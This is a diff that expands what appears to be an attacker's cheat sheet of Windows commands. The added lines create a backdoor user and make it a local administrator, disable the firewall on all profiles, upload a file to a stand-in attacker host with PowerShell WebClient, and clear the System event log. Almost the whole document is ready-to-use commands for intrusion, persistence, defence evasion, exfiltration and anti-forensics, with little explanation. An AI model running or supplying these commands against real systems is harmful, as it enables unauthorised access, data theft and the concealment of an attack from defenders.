@@ -50,4 +50,19 @@
 
 ### Post Exploitation
 
- - net user /add USER
+ - net user /add USERNAME PASSWORD (Add a backdoor user)
+
+ - Net Localgroup Administrators USERNAME /add (Add your backdoor user to local administrators group)
+
+### Defensive Evasion
+
+ - Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False (Disable Firewall)
+
+### Data Exfiltration
+
+ - (New-Object System.Net.WebClient).UploadFile("http://attacker.com/upload", "C:\path\to\data.txt") (Send data to attacking machine)
+
+### Log Management
+
+ - wevtutil cl System (Clear event logs)
+
